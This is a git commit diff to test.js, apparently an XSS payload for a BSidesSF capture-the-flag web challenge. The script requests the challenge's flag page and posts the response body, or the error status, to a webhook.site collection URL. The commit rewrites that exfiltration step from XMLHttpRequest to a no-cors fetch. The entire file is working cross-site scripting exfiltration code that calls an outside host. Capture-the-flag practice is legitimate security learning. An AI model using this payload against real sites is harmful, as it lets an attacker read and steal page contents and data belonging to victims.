4ea772530a5015b9b11330c6051de0fe3fcc7996
sote-CJ <51846573+sote-CJ@users.noreply.github.com>
2026-03-21 08:56:13 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,15 +1,15 @@
 var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag', true);
 xhr.onload = function() {
-    var exfil = new XMLHttpRequest();
-    exfil.open('POST', 'https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/', true);
-    exfil.setRequestHeader('Content-Type', 'text/plain');
-    exfil.send(xhr.responseText);
+    fetch('https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: xhr.responseText
+    });
 };
 xhr.onerror = function() {
-    var exfil = new XMLHttpRequest();
-    exfil.open('POST', 'https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/', true);
-    exfil.setRequestHeader('Content-Type', 'text/plain');
-    exfil.send('error: ' + xhr.status);
+    fetch('https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/?error=' + xhr.status, {
+        mode: 'no-cors'
+    });
 };
 xhr.send();
